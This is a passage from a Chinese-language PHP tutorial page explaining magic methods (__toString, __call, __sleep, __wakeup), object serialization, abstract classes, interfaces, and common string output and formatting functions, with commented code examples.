//通过构造方法传值为成员属性赋初值</div><div class="line">        		$this-&gt;foo = $foo;      //为成员属性赋值</div><div class="line">   		&#125;</div><div class="line">  </div><div class="line">		public function __toString() &#123;  //在类中定义一个__toString方法 </div><div class="line">        		return $this-&gt;foo;       //返回一个成员属性$foo的值</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$obj = new TestClass(&apos;Hello&apos;);     //创建一个对象并赋值给对象引用$obj</div><div class="line">	echo $obj;                     //直接输出对象引用则自动调用了对象中的__toString()方法输出Hello</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="通过-call-方法处理错误调用"><a href="#通过-call-方法处理错误调用" class="headerlink" title="通过__call()方法处理错误调用"></a>通过__call()方法处理错误调用</h3><p>在调用对象中不存在的方法时就会出现系统出错，然后程序退出不能继续执行。如果在类中添加一个魔术方法call()，则调用对象中不存在的方法时就会自动调用该方法，并且程序可以继续向下执行。可以通过在call()方法中的设置，提示用户调用的方法及需要的参数列表内容不存在。<strong>call()方法需要两个参数，第一个参数是调用不存在的方法时，接受这个不存在的方法的方法名，并将这个不存在的方法中，使用的参数列表形成数组传给</strong>call()方法中的第二个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class TestClass &#123;                 //声明一个测试类，在类中声明printHello()和__call()方法</div><div class="line">		function printHello() &#123;        //声明一个方法，可以让对象成功能调用</div><div class="line">			echo &quot;Hello&lt;br&gt;&quot;;       //执行时输出一条语句</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function __call($functionName, $args) &#123;     //声明此方法用来处理调用对象中不存在的方法</div><div class="line">			echo &quot;你所调用的函数：&quot;.$functionName.&quot;(参数：&quot;;  //输出调用不存在的方法名</div><div class="line">			print_r($args);                                  //输出调用不存在的方法时的参数列表</div><div class="line">			echo &quot;)不存在！&lt;br&gt;\n&quot;;                         //输出符加的一些提示信息</div><div class="line">		&#125;	</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$obj=new TestClass();              //通过类TestClass实例化一个对象</div><div class="line">	$obj-&gt;myFun(&quot;one&quot;, 2, &quot;three&quot;);      //调用对象中不存在的方法，则自动调用了对象中的__call()方法</div><div class="line">	$obj-&gt;otherFun(8,9);               //调用对象中不存在的方法，则自动调用了对象中的__call()方法</div><div class="line">	$obj-&gt;printHello();                 //调用对象中存在的方法，可以成功调用</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="对象串行化"><a href="#对象串行化" class="headerlink" title="对象串行化"></a>对象串行化</h3><p>对象通过写出描述自己状态的数值来记录自己，这个过程叫对象的串行化。串行化就是把整个对象转化为二进制字符串，有两种情况我们必须把对象串行化。</p>
<ul>
<li>对象需要在网络中传输时，将对象串行化化成二进制串后在网络中传输。</li>
<li>对象需要持久保存时，将对象串行化后写入文件或是数据库中。<br>使用serialize()函数来串行化一个对象，把对象转化为二进制的字符串。serialize()函数需要一个参数就是对象的引用名，返回值为一个对象被串行化后的字符串。serialize()返回的字符串含义模糊，一般我们不会解析这个串来得到对象的信息。<br>另一个是反串行化后转化的二进制字符串再转化为对象，我们使用unserialize()函数来反串行化一个对象。这个函数的参数即为serialize()函数的返回值，返回值当然是重新组织好的对象。</li>
</ul>
<p>class_Person.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;        //声明一个Person类，包含三个成员属性和一个成员方法</div><div class="line">		private $name;   //人的名子</div><div class="line">		private $sex;     //人的性别</div><div class="line">		private $age;     //人的年龄</div><div class="line">	</div><div class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=&quot;&quot;) &#123;   //构造方法为成员属性赋初值</div><div class="line">			$this-&gt;name=$name;</div><div class="line">			$this-&gt;sex=$sex;</div><div class="line">			$this-&gt;age=$age;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function say()  &#123;       //这个人可以说话的方法, 说出自己的成员属性</div><div class="line">			echo &quot;我的名字叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>serialize.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require &quot;class_Person.php&quot;;                	//在本文件中包含Person类所在的脚本文件</div><div class="line">	$person=new Person(&quot;张三&quot;, &quot;男&quot;, 20);      	//能过Person类创建一个对象，对象的引用名为$person</div><div class="line">	$person_string=serialize($person);         	 //通过serialize函数将对象串行化，返一个字符串</div><div class="line">	file_put_contents(&quot;file.txt&quot;, $person_string);	 //将对象串行化后返回的字符串保存到file.txt文件中</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>unserialize.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require &quot;class_Person.php&quot;;	               //在本文件中包含Person类所在的脚本文件</div><div class="line">	$person_string=file_get_contents(&quot;file.txt&quot;);  //将file.txt文件中的字符串读出来并赋给变量$person_string</div><div class="line">	$person=unserialize($person_string); 	       //进行反串行化操作，形成对象$person。</div><div class="line">	$person-&gt;say();                         	//调用对象中的say()方法，用来测试反串行化对象是否成功</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在PHP5中还有两个魔术方法sleep()和wakeup()可以使用。在调用serialize()函数将对象串行化时，会自动调用对象中的sleep()方法，用来将对象中的部分成员串行化。在调用unserialize()函数反串行化对象时，则会自动调用对象中的__wakeup()方法，用来在二进制串重新组成一个对象时，为新对象中的成员属性重新初始化。<br>sleep()函数不需要接受任何参数，但需要返回一个数组，在数组中包含需要串行化的属性。未被包含在数组中的属性将在串行化被忽略。如果没有在类中声明sleep()方法，对象中的所有属性都将被串行化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;        //声明一个Person类，包含三个成员属性和一个成员方法</div><div class="line">		private $name;   //人的名子</div><div class="line">		private $sex;     //人的性别</div><div class="line">		private $age;     //人的年龄</div><div class="line">	</div><div class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=&quot;&quot;) &#123;   //构造方法为成员属性赋初值</div><div class="line">			$this-&gt;name=$name;</div><div class="line">			$this-&gt;sex=$sex;</div><div class="line">			$this-&gt;age=$age;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function say()  &#123;              //这个人可以说话的方法, 说出自己的成员属性</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function __sleep() &#123;            //在类中添加此方法，在串行化时自动调用并返回数组</div><div class="line">			$arr=array(&quot;name&quot;, &quot;age&quot;);  //数组中的成员$name和$age将被串行化，成员$sex则被忽略</div><div class="line">			return($arr);              //返回一个数组</div><div class="line">		&#125; </div><div class="line">		</div><div class="line">		function __wakeup() &#123;          //在反串行化对象时自动调用该方法，没有参数也没有返回值</div><div class="line">			 $this-&gt;age = 40;         //在重新组织对象时，为新对象中的$age属性重新赋值</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);        //通过Person类实例化对象，对象引用名为$person1</div><div class="line">	//把一个对象串行化，返一个字符串，调用了__sleep()方法,忽略没在数组中的属性$sex</div><div class="line">	$person_string=serialize($person1); </div><div class="line">	echo $person_string.&quot;&lt;br&gt;&quot;;                  //输出对象串行化的字符串</div><div class="line"> </div><div class="line">   	 //反串行化对象，并自动调用了__wakup()方法重新为新对象中的$age属性赋值</div><div class="line">	$person2=unserialize($person_string);          //反串行化对象形成对象$p2重新赋值$age为40</div><div class="line">	$person2-&gt;say();                           //调用新对象中say()方法输出的成员中已没有$sex属性了</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h2><h3 id="抽象方法和抽象类"><a href="#抽象方法和抽象类" class="headerlink" title="抽象方法和抽象类"></a>抽象方法和抽象类</h3><p>抽象方法就是没有方法体的方法，所谓的没有方法体是指在方法声明时没有花括号以及其中的内容，而是在声明方法时直接在方法后加上分号结束。另外在声明抽象方法时，还要使用关键字abstract来修饰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">abstract function fun1()		//不能有花括号，就更不能有方法体中的内容了</div><div class="line">abstract function fun2()		//直接在方法名的括号后面加上分号结束，还要使用abstract修饰</div></pre></td></tr></table></figure></p>
<p>抽象类使用abstract关键字来修饰。在抽象类中可以有不是抽象的成员方法和成员属性，但访问权限不能使用private关键字修饰为私有的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	abstract class Person &#123;             //声明一个抽象类，要使用abstract关键字标识</div><div class="line">		protected $name;             //声明一个存储人的名子的成员</div><div class="line">		protected $country;           //声明一个存储人的国家的成员</div><div class="line">			</div><div class="line">	    	function __construct($name=&quot;&quot;, $country=&quot;china&quot;) &#123;  //构造方法用来创建对象并初使化成员属性</div><div class="line">			$this-&gt;name = $name;                      //为成员属性name在创建对象时赋初值</div><div class="line">			$this-&gt;country = $country;                  //为成员属性country在创建对象时赋初值</div><div class="line">		&#125;</div><div class="line"> </div><div class="line">		abstract function say();   //在抽象类中声明一个没有方法体的抽象方法，使用abstract关键字标识</div><div class="line">	</div><div class="line">		abstract function eat();   //在抽象类中声明另一个没有方法体的抽象方法，使用abstract关键字标识</div><div class="line">		</div><div class="line">		function run()&#123;         //在抽象类中可以声明正常的非抽象的方法</div><div class="line">			echo &quot;使用两条腿走路&lt;br&gt;&quot;;                //有方法体，输出一条语句</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在抽象类中没有被实现的抽象方法，所以抽象类是不能被实例化的，即创建不了对象，也就是不能直接使用它。使用抽象类就包含了继承关系，它是为它的子类定义公共接口，将它的曹交给子类去遵守。当子类继承抽象类以后，就必须把抽象类中的抽象方法按照子类自己的需要去实现。子类必须把父类中的抽象方法全部都实现，否则子类中还存在抽象方法，所以还是抽象类，也不能实例化对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class ChineseMan extends Person &#123;     //声明一个类去继承抽象类Person</div><div class="line">		function say() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</div><div class="line">			echo $this-&gt;name.&quot;是&quot;.$this-&gt;country.&quot;人，讲汉语&lt;br&gt;&quot;;      //实现的内容</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function eat() &#123;                 //将父类中的抽象方法覆盖，按自已的需求去实现</div><div class="line">			echo $this-&gt;name.&quot;使用筷子吃饭&lt;br&gt;&quot;;                    //实现的内容</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class Americans extends Person &#123;      //声明另一个类去继承抽象类Person</div><div class="line">		function say() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</div><div class="line">			echo $this-&gt;name.&quot;是&quot;.$this-&gt;country.&quot;人，讲英语&lt;br&gt;&quot;;     //实现的内容</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function eat() &#123;                //将父类中的抽象方法覆盖，按自已的需求去实现</div><div class="line">			echo $this-&gt;name.&quot;使用刀子和叉子吃饭&lt;br&gt;&quot;;              //实现的内容</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$chineseMan = new ChineseMan(&quot;高洛峰&quot;, &quot;中国&quot;);      //将第一个Person的子类实例化对象</div><div class="line">	$americans =new Americans(&quot;alex&quot;, &quot;美国&quot;);             //将第二个Person的子类实例化对象</div><div class="line"></div><div class="line">	$chineseMan-&gt;say();              //通过第一个对象调用子类中已经实例父类中抽象方法的say()方法</div><div class="line">	$chineseMan-&gt;eat();               //通过第一个对象调用子类中已经实例父类中抽象方法的eat()方法</div><div class="line"></div><div class="line">	$americans-&gt;say();               //通过第二个对象调用子类中已经实例父类中抽象方法的say()方法</div><div class="line">	$americans-&gt;eat();                //通过第二个对象调用子类中已经实例父类中抽象方法的eat()方法</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="接口技术"><a href="#接口技术" class="headerlink" title="接口技术"></a>接口技术</h3><p>接口是一种特殊的抽象类，而抽象类又是一种特殊的类，所以接口也是一种特殊的类。接口中声明的方法必须都是抽象方法，另外不能在接口中声明变量，只能使用const关键字声明为常量的成员属性，而且接口中所有成员都必须有public的访问权限。<br>类的声明是使用“class”关键字标识的，而接口的声明则使用“interface”关键字表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">interface 接口名称｛			//使用interface关键字声明接口</div><div class="line">	//常量成员				//接口中的成员属性只能是常量，不能是变量</div><div class="line">	//抽象方法				//接口中的所有方法必须是抽象方法，不能有非抽象的方法存在</div><div class="line">｝						//接口中的成员也需要用花括号包含起来</div></pre></td></tr></table></figure></p>
<p>如果需要使用接口中的成员，则需要通过子类去实现接口中的全部抽象方法，然后创建子类的对象去调用在子类中实现后的方法。但通过类去继承接口时需要使用implements关键字来实现，而并不是是哟个extends关键字完成。如果需要使用抽象类去实现接口中的部分方法，也需要使用implements关键字实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	interface One &#123;                              //声明一个接口使用interface关键字，One为接口名称</div><div class="line">		const CONSTANT = &apos;CONSTANT value&apos;;    //在接口中声明一个常量成员属性，和在类中声明一样</div><div class="line">		function fun1();                         //在接口中声明一个抽象方法“fun1()”</div><div class="line">		function fun2();                         //在接口中声明另一个抽象方法“fun2()”</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	abstract class Three implements One &#123;          //声明一个抽象类去实现接口One中的第二个方法</div><div class="line">		function fun2() &#123;                       //只实现接口中的一个抽象方法</div><div class="line">			//具体的实现内容由子类自决定</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class Four implements One &#123;                 //声明一个类实现接口One中的全部抽象方法</div><div class="line">		function fun1() &#123;                      //实现接口中第一个方法</div><div class="line">			//具体的实现内容由子类自决定</div><div class="line">		&#125;	</div><div class="line"></div><div class="line">		function fun2() &#123;                     //实现接口中的第二个方法</div><div class="line">			//具体的实现内容由子类自决定</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>PHP是单继承的，一个类只能有一个父类，但是一个类可以实现多个接口。将要实现的多个接口之间使用逗号分隔开，而且在子类中要将所有接口中的抽象方法全部实现才可以创建对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">class 类名 implements 接口一，接口二...接口n&#123;  //一个类实现多个接口</div><div class="line">			//实现所有接口中的抽象类</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实现多个接口是使用“implements”关键字，同时还可以使用“extends”关键字继承一个类。即在继承一个类的同时实现多个接口，但一定要先使用extends继承一类再去使用imlements实现多个接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">class  类名 extends 父类名 implements 接口一，接口二...接口n&#123;  //继承一个类的同时实现多个接口</div><div class="line">		//实现所有接口中的抽象类</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="字符串处理与正则表达式"><a href="#字符串处理与正则表达式" class="headerlink" title="字符串处理与正则表达式"></a>字符串处理与正则表达式</h1><h2 id="字符串的处理介绍"><a href="#字符串的处理介绍" class="headerlink" title="字符串的处理介绍"></a>字符串的处理介绍</h2><h3 id="字符串的处理方式"><a href="#字符串的处理方式" class="headerlink" title="字符串的处理方式"></a>字符串的处理方式</h3><p>在PHP中，提供了大量的字符串操作函数，功能强大，使用也比较简单。但对一些比较复杂的字符串操作，则需要借助PHP所支持的正则表达式来实现。如果字符串处理函数和正则表达式都可以实现字符串操作，建议使用字符串处理函数来完成，因为字符串的处理函数要比正则表达式处理字符串的效率高。</p>
<h3 id="字符串类型的特点"><a href="#字符串类型的特点" class="headerlink" title="字符串类型的特点"></a>字符串类型的特点</h3><p>因为PHP是弱类型语言，所以其他类型的数据一般都可以直接应用于字符串操作函数里，而自动转化为字符串进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo substr(&quot;1234567&quot;,2,4);				//将字符串用于字符串函数substr()处理，输出子字符串345</div><div class="line">	echo substr(123456,2,4);				//将整型用于字符串substr()处理，输出同样是字符串345</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>还可以将字符串视为数组，当做字符集合看待<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str=&quot;lamp&quot;;				//声明一个字符串$str，值为lamp</div><div class="line">	echo $str.&quot;&lt;br&gt;&quot;;			//将字符串看作是一个连续的实体，一起输出lamp</div><div class="line">	//以下将字符串看作字符集合，按数组方式一个一个输出</div><div class="line">	echo $str[0];			//输出字符串$str中第一个字符l</div><div class="line">	echo $str[1];			//输出字符串$str中第一个字符a</div><div class="line">	echo $str[2];			//输出字符串$str中第一个字符m</div><div class="line">	echo $str[3];			//输出字符串$str中第一个字符p</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>但将字符串看做字符集合时，PHP脚本引擎无法区分是字符还是数组，会带来二义性。所以中括号的语法已不再使用，替代它的是使用花括号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str=&quot;lamp&quot;;		//声明一个字符串$str，值为lamp</div><div class="line">	echo $str&#123;0&#125;;		//输出字符串$str中第一个字符l</div><div class="line">	echo $str&#123;1&#125;;		//输出字符串$str中第一个字符a</div><div class="line">	echo $str&#123;2&#125;;		//输出字符串$str中第一个字符m</div><div class="line">	echo $str&#123;3&#125;;		//输出字符串$str中第一个字符p</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="常用的字符串输出函数"><a href="#常用的字符串输出函数" class="headerlink" title="常用的字符串输出函数"></a>常用的字符串输出函数</h2><table>
<thead>
<tr>
<th>函数名</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>echo()</td>
<td style="text-align:left">输出字符串</td>
</tr>
<tr>
<td>print()</td>
<td style="text-align:left">输出一个或多个字符串</td>
</tr>
<tr>
<td>die()</td>
<td style="text-align:left">输出一条消息，并退出当前脚本</td>
</tr>
<tr>
<td>printf()</td>
<td style="text-align:left">输出格式化字符串</td>
</tr>
<tr>
<td>sprintf()</td>
<td style="text-align:left">把格式化的字符串写入一个变量中</td>
</tr>
</tbody>
</table>
<h3 id="函数echo"><a href="#函数echo" class="headerlink" title="函数echo()"></a>函数echo()</h3><p>该函数用于输出一个或多个字符串，是在PHP中使用最多的函数，因为使用它的效率要比其他字符串输出函数高。echo()实际上不是一个函数，因此您不需对其使用括号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str = &quot;What&apos;s LAMP?&quot;;             //定义一个字符串$str</div><div class="line">	echo $str;                         //可以直接输出字符串变量</div><div class="line">	echo &quot;&lt;br&gt;&quot;;                      //也可以直接输出字符串</div><div class="line">	echo $str.&quot;&lt;br&gt;Linux+Apache+MySQL+PHP&lt;br&gt;&quot;;  //还可以使用点运算符号连接多个字符串输出</div><div class="line"></div><div class="line">	echo &quot;This                    </div><div class="line">	      text </div><div class="line">	      spans </div><div class="line">	      multiple </div><div class="line">	      lines.&lt;br&gt;&quot;;                //可以将一行文本换成多行输出</div><div class="line"></div><div class="line">	echo &apos;This &apos;,&apos;string &apos;,&apos;was &apos;,&apos;made &apos;,&apos;with multiple parameters&lt;br&gt;&apos;;  //可以输出用逗号隔开的多个参数</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="函数print"><a href="#函数print" class="headerlink" title="函数print()"></a>函数print()</h3><p>该函数的功能和echo()的一样，它有返回值，若成功则返回1，失败则返回0。它的执行效率没有echo()函数高。</p>
<h3 id="函数die"><a href="#函数die" class="headerlink" title="函数die()"></a>函数die()</h3><p>该函数是exit()函数的别名。如果参数是一个字符串，则该函数会在退出前输出它。如果参数是一个整数，这个值会被用做退出状态。退出状态的值在0至254之间。退出状态255有PHP保留，不会被使用。状态0用于成功地终止程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$url = &quot;http://www.lampbrother.net&quot;;               //定义一个网络文件的位置</div><div class="line">	fopen($url,&quot;r&quot;)	or die(&quot;Unable to connect to $url&quot;);  //如果打开失败则输出一条消息并退出程序</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="函数printf"><a href="#函数printf" class="headerlink" title="函数printf()"></a>函数printf()</h3><p>该函数用于输出格式化的字符串，和C语言的同名函数用法一样。第一个参数为必选项，是规定的字符串以及如何格式化其中的变量。还可以有多个可选参数，是规定插到第一个参数的格式化字符串中对应%符号处的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(format,arg1,arg2,...,argn)</div></pre></td></tr></table></figure></p>
<p>第一个参数中使用的转换格式，是以百分比符号（“%”）开始到转换字符结束。</p>
<table>
<thead>
<tr>
<th>格式</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>%%</td>
<td style="text-align:left">返回百分比符号</td>
</tr>
<tr>
<td>%b</td>
<td style="text-align:left">二进制数</td>
</tr>
<tr>
<td>%c</td>
<td style="text-align:left">按照ASCII值的字符</td>
</tr>
<tr>
<td>%d</td>
<td style="text-align:left">带符号十进制数</td>
</tr>
<tr>
<td>%e</td>
<td style="text-align:left">科学计数法</td>
</tr>
<tr>
<td>%u</td>
<td style="text-align:left">无符号十进制数</td>
</tr>
<tr>
<td>%f</td>
<td style="text-align:left">浮点数（local setting aware）</td>
</tr>
<tr>
<td>%F</td>
<td style="text-align:left">浮点数（not local setting aware）</td>
</tr>
<tr>
<td>%o</td>
<td style="text-align:left">八进制数</td>
</tr>
<tr>
<td>%s</td>
<td style="text-align:left">字符串</td>
</tr>
<tr>
<td>%x</td>
<td style="text-align:left">十六进制数（小写字母）</td>
</tr>
<tr>
<td>%X</td>
<td style="text-align:left">十六进制数（大写字母）</td>
</tr>
</tbody>
</table>
<p>arg1,arg2,argn等参数将插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个%符号中，插入arg1，在第二个%符号处，插入arg2，依次类推。如果%符号多于arg参数，则必须使用占位符。占位符被插入%符号之后，由数组和“\$”组成。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str = &quot;LAMP&quot;;             //声明一个字符串数据</div><div class="line">	$number = 789;             //声明一个整型数据</div><div class="line">     </div><div class="line">	//将字符串$str在第一个参数中的%处输出，按%s的字符串输出，整型$number按%u输出</div><div class="line">	printf(&quot;%s book. page number %u &lt;br&gt;&quot;,$str,$number);       </div><div class="line">	printf(&quot;%0.3f &lt;br&gt;&quot;,$number);  //将整型$number按浮点数输出，并在小数点后保留3位</div><div class="line"></div><div class="line">	$format = &quot;The %2\$s book contains %1\$d pages.</div><div class="line">           That&apos;s a nice %2\$s full of %1\$d pages. &lt;br&gt;&quot;;   //定义一个格式并在其中使用占位符</div><div class="line">	printf($format, $number, $str);  //按格式的占位符号输出多次变量，%2$s位置处是第三个参数</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="函数sprintf"><a href="#函数sprintf" class="headerlink" title="函数sprintf()"></a>函数sprintf()</h3><p>该函数的用法和printf()的格式相似，但它并不是输出字符串，而是把格式化的字符串以返回值的形式写入到一个变量中。这样就可以将格式化后的字符串在需要时使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$num= 12345;              	 //声明一个整数12345</div><div class="line">	$txt = sprintf(&quot;%0.2f&quot;,$num);    //转换为保留两位小数的浮点数，并赋值给变量$text</div><div class="line">	echo $txt;                  	 //在需要的地方就可以使用格式化后的文本$txt</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="常用的字符串格式化函数"><a href="#常用的字符串格式化函数" class="headerlink" title="常用的字符串格式化函数"></a>常用的字符串格式化函数</h2><table>
<thead>
<tr>
<th>格式</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>ltrim()</td>
<td style="text-align:left">从字符串左侧删除空格或者其他预定义字符</td>
</tr>
<tr>
<td>rtrim()</td>
<td style="text-align:left">从字符串的末端开始删除空白字符或其他预定义字符</td>
</tr>
<tr>
<td>trim()</td>
<td style="text-align:left">从字符串的两端删除空白字符和其他预定义字符</td>
</tr>
<tr>
<td>str_pad()</td>
<td style="text-align:left">把字符串填充为新的长度</td>
</tr>
<tr>
<td>strtolower()</td>
<td style="text-align:left">把字符串转换为小写</td>
</tr>
